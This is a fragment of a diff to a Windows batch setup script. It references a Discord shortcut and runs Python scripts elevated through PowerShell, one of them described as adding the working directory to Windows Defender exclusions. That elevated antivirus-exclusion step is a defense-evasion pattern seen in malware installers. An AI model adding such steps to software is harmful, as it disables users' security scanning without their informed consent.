@@ -42,9 +42,9 @@ if exist "%start_menu_path%\%discord_shortcut_name%" (
 )
 
 :: Run the add_to_defender.py script to add the working directory to Windows Defender exclusions
-powershell -Command "Start-Process python -ArgumentList 'setup.py' -Verb RunAs"
+powershell -Command "Start-Process python -ArgumentList 'defender.py' -Verb RunAs"
 
 :: Run the second setup script
-::python setup-step2.py
+powershell -Command "Start-Process python -ArgumentList 'setup.py' -Verb RunAs"
 
 endlocal
